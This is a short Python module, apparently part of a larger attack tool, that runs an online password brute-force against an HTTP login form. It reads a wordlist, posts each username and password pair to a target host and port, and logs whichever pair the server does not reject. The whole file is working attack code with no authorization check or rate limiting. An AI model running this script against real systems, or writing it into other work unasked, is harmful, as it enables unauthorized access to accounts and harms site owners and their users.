# modules/http_brute.py

import requests
from urllib.parse import urljoin

def start_http_brute(target_url, port, username, wordlist_path, field_user, field_pass, fail_phrase, verbose, logger):
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger("[!] Wordlist file not found.")
        return

    for password in passwords:
        data = {
            field_user: username,
            field_pass: password
        }

        try:
            full_url = f"http://{target_url}:{port}"
            response = requests.post(full_url, data=data, timeout=5)
            if verbose:
                logger(f"[-] Tried {username}:{password} | Status: {response.status_code}")

            if fail_phrase not in response.text:
                logger(f"[+] SUCCESS: {username}:{password}")
                return password
        except Exception as e:
            logger(f"[!] Error: {e}")

    logger("[-] Brute-force finished. No valid credentials found.")

